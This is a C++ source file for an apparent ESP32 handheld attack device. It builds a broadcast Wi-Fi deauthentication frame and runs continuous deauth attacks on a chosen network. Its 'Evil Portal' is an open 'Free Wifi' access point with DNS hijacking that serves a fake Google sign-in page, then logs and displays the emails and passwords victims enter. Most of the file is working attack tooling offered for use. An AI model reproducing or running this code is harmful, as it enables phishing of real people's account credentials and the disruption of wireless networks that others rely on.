#include "attacks.h"
#include "display.h"
#include "utils.h"

// Définition avec une taille fixe
const uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x07, 0x00
};

const char* evilPortalHtml = R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <style>
      body { font-family: sans-serif; }
      .login-container {
        width: 85%;
        margin: auto;
        padding: 20px;
        border-radius: 5px;
        margin-top: 10px;
      }
      #logo { margin: auto; width: fit-content; }
      .g-h1 { font-size: 25px; text-align: center; font-weight: 200; margin: auto; }
      .g-h2 { font-size: 15px; text-align: center; font-weight: 200; margin: auto; }
      .g-input {
        width: 95%;
        height: 30px;
        background-color: transparent;
        font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
        border-width: 0.5px;
        border-color: rgba(0, 0, 0, 0.6);
        border-radius: 4px;
        font-size: 16px;
        padding: 13px 9px;
        margin-bottom: 10px;
      }
      .create-account {
        font-size: smaller;
        color: #1a73e8;
        text-decoration: none;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        letter-spacing: 0.25px;
      }
      .gbtn-primary {
        min-width: 64px;
        border: none;
        margin-top: 6px;
        margin-bottom: 6px;
        height: 36px;
        border-radius: 4px;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        font-weight: 500;
        padding: 0 24px;
        box-sizing: inherit;
        background-color: rgb(26, 115, 232);
        color: #fff;
      }
      .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .text {
        font-family: Roboto, "Noto Sans Myanmar UI", Arial, sans-serif;
        white-space: normal;
        color: #5f6368;
        font-size: 14px;
        line-height: 1.4286;
        padding-bottom: 3px;
        padding-top: 9px;
        box-sizing: inherit;
      }
      .txt {
        text-decoration: none;
        border-radius: 4px;
        color: #1a73e8;
      }
    </style>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  </head>
  <body>
    <div class="login-container">
      <div id="logo">
        <!-- Logo SVG -->
      </div>
      <form action="/get" id="email-form-step">
        <h1 class="g-h1">Sign in</h1>
        <h2 class="g-h2">Use your Google Account</h2>
        <div class="login-content">
          <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
          <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
          <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt">Learn more</a></div>
          <div class="button-container">
            <a class="create-account" href="caca.html">Create account</a>
            <button class="gbtn-primary" type="submit">Next</button>
          </div>
        </div>
      </form>
    </div>
  </body>
</html>
)rawliteral";

void displayWifiAttackSubMenu() {
  int attackOption = 0;
  bool selectionDone = false;
  while (!selectionDone) {
    displayWifiAttackOptions(attackOption);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      attackOption = (attackOption + 1) % 2;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }
  if (attackOption == 0)
    displayWifiDeauthAttack();
  else
    displayWifiEvilPortal();
}

void displayWifiAttackOptions(int attackOption) {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  if (attackOption == 0)
    tft.drawString("Deauth Attack", tft.width()/2, tft.height()/2 - 10);
  else
    tft.drawString("Evil Portal", tft.width()/2, tft.height()/2 - 10);

  tft.setTextSize(1);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("B: Change | A: Select", tft.width()/2, tft.height()-20);
}

void displayWifiDeauthAttack() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("WiFi Attack", tft.width()/2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Scanning networks...", 10, 50);

  int n = WiFi.scanNetworks();
  delay(500);
  if (n == 0) {
    tft.fillScreen(COLOR_BLACK);
    tft.drawString("No networks found", 10, 70);
    waitForButtonPress(BUTTON_A);
    displayMenu();
    return;
  }

  int targetIndex = selectWifiNetwork(n);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Target:", tft.width()/2, 30);
  tft.drawString(WiFi.SSID(targetIndex), tft.width()/2, 60);
  delay(2000);

  int channel = WiFi.channel(targetIndex);
  continuousDeauthAttackToAll(channel);
  displayMenu();
}

int selectWifiNetwork(int n) {
  int targetIndex = 0;
  bool selectionDone = false;
  const int pageSize = 5;
  int pageStart = 0;
  const int listY = 40;
  const int listH = pageSize * 20;

  while (!selectionDone) {
    displayWifiNetworks(targetIndex, pageStart, pageSize, listY, listH, n);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      targetIndex = (targetIndex + 1) % n;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }
  return targetIndex;
}

void displayWifiNetworks(int targetIndex, int &pageStart, int pageSize, int listY, int listH, int n) {
  tft.fillRect(0, 0, tft.width(), listY, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Select Network", tft.width()/2, 10);

  pageStart = targetIndex - pageSize / 2;
  if (pageStart < 0) pageStart = 0;
  if (pageStart + pageSize > n) pageStart = n - pageSize;
  if (pageStart < 0) pageStart = 0;

  tft.fillRect(0, listY, tft.width(), listH, COLOR_BLACK);
  for (int i = pageStart; i < pageStart + pageSize && i < n; i++) {
    int yPos = listY + (i - pageStart) * 20;
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 20) {
      ssid = ssid.substring(0, 20) + "...";
    }
    String info = String(i + 1) + ": " + ssid + " (Ch:" + String(WiFi.channel(i)) + ")";
    if (i == targetIndex) {
      tft.fillRect(5, yPos - 2, tft.width() - 10, 18, main_color);
      tft.setTextColor(COLOR_BLACK, main_color);
    } else {
      tft.setTextColor(main_color, COLOR_BLACK);
    }
    tft.setTextSize(1);
    tft.setTextDatum(TL_DATUM);
    tft.drawString(info, 10, yPos);
  }
  tft.fillRect(0, tft.height()-20, tft.width(), 20, COLOR_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("B: Next | A: Select", tft.width()/2, tft.height()-15);
}

void displayWifiEvilPortal() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Evil Portal", tft.width()/2, 20);

  const char* ap_ssid = "Free Wifi";
  WiFi.mode(WIFI_AP);
  if (WiFi.softAP(ap_ssid)) {
    Serial.println("AP launched (open)");
  } else {
    Serial.println("Error launching AP");
  }

  IPAddress apIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(apIP);

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", [](){
    server.send(200, "text/html", evilPortalHtml);
  });
  server.on("/get", [](){
    handleCapturedCredentials();
  });
  server.onNotFound([apIP](){
    server.sendHeader("Location", String("http://") + apIP.toString() + "/", true);
    server.send(302, "text/plain", "");
  });
  server.begin();

  displayEvilPortalRunningScreen();

  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    dnsServer.processNextRequest();
    server.handleClient();
    delay(10);
  }
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(500);
  displayMenu();
}

void handleCapturedCredentials() {
  String email = server.arg("email");
  String password = server.arg("password");
  Serial.println("Captured credentials:");
  Serial.println("Email: " + email);
  Serial.println("Password: " + password);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Login received", tft.width()/2, 20);
  tft.setTextSize(1);
  tft.drawString("Email:", tft.width()/2, 50);
  tft.drawString(email, tft.width()/2, 70);
  tft.drawString("Password:", tft.width()/2, 90);
  tft.drawString(password, tft.width()/2, 110);

  delay(3000);
  server.send(200, "text/html", "<html><body><h1>Please wait...</h1></body></html>");
}

void displayEvilPortalRunningScreen() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Evil Portal Running", tft.width()/2, tft.height()/2 - 20);
  tft.setTextSize(1);
  tft.drawString("SSID: Free Wifi", tft.width()/2, tft.height()/2);
  tft.drawString("No password", tft.width()/2, tft.height()/2 + 10);
  tft.drawString("A: Stop", tft.width()/2, tft.height()-20);
}

void displayBLEAttack() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("BLE Attack", tft.width()/2, tft.height()/2);
  delay(1000);
  displayMenu();
}